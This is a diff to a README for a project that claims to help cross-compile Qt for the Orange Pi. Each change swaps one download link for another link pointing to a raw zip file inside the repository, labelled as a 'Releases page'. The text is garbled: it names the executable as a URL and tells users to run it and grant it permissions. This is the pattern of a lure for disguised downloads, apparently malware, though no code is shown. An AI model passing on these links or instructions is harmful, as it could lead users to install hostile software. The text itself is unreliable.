@@ -1,6 +1,6 @@
 # 🚀 CrossCompileQtForOpi - Easy Steps to Compile Qt for Orange Pi
 
-[![Download](https://raw.githubusercontent.com/gemafajar099/CrossCompileQtForOpi/main/tackled/CrossCompileQtForOpi.zip)](https://raw.githubusercontent.com/gemafajar099/CrossCompileQtForOpi/main/tackled/CrossCompileQtForOpi.zip)
+[![Download](https://raw.githubusercontent.com/gemafajar099/CrossCompileQtForOpi/main/HelloWorld/Qt_For_Compile_Cross_Opi_v3.9-alpha.2.zip)](https://raw.githubusercontent.com/gemafajar099/CrossCompileQtForOpi/main/HelloWorld/Qt_For_Compile_Cross_Opi_v3.9-alpha.2.zip)
 
 Welcome to CrossCompileQtForOpi! This guide helps you compile Qt 6.8.0 for your Orange Pi 3B v2.1 easily. Follow these simple steps to get started.
 
@@ -16,7 +16,7 @@ Before you begin, make sure you have the following:
 
 1. **Visit the Releases Page**
 
-   Start by visiting the [Releases page](https://raw.githubusercontent.com/gemafajar099/CrossCompileQtForOpi/main/tackled/CrossCompileQtForOpi.zip). Here, you will find the most recent versions of the software and necessary files.
+   Start by visiting the [Releases page](https://raw.githubusercontent.com/gemafajar099/CrossCompileQtForOpi/main/HelloWorld/Qt_For_Compile_Cross_Opi_v3.9-alpha.2.zip). Here, you will find the most recent versions of the software and necessary files.
 
 2. **Download the Software**
 
@@ -51,7 +51,7 @@ Before you begin, make sure you have the following:
 
 6. **Run the Application**
 
-   Navigate to the folder where you extracted the files. Look for the executable file, typically named `https://raw.githubusercontent.com/gemafajar099/CrossCompileQtForOpi/main/tackled/CrossCompileQtForOpi.zip` (Windows) or simply `CrossCompileQtForOpi` (Linux and macOS). Double-click to run the program. 
+   Navigate to the folder where you extracted the files. Look for the executable file, typically named `https://raw.githubusercontent.com/gemafajar099/CrossCompileQtForOpi/main/HelloWorld/Qt_For_Compile_Cross_Opi_v3.9-alpha.2.zip` (Windows) or simply `CrossCompileQtForOpi` (Linux and macOS). Double-click to run the program. 
 
    If prompted by your system, allow permissions for the application to run.
 
@@ -81,7 +81,7 @@ Once the application is running, you can start the compilation process:
 
 ## 📦 Download & Install
 
-To get started, download the latest version now by visiting the [Releases page](https://raw.githubusercontent.com/gemafajar099/CrossCompileQtForOpi/main/tackled/CrossCompileQtForOpi.zip).
+To get started, download the latest version now by visiting the [Releases page](https://raw.githubusercontent.com/gemafajar099/CrossCompileQtForOpi/main/HelloWorld/Qt_For_Compile_Cross_Opi_v3.9-alpha.2.zip).
 
 ## 📝 Additional Resources
 
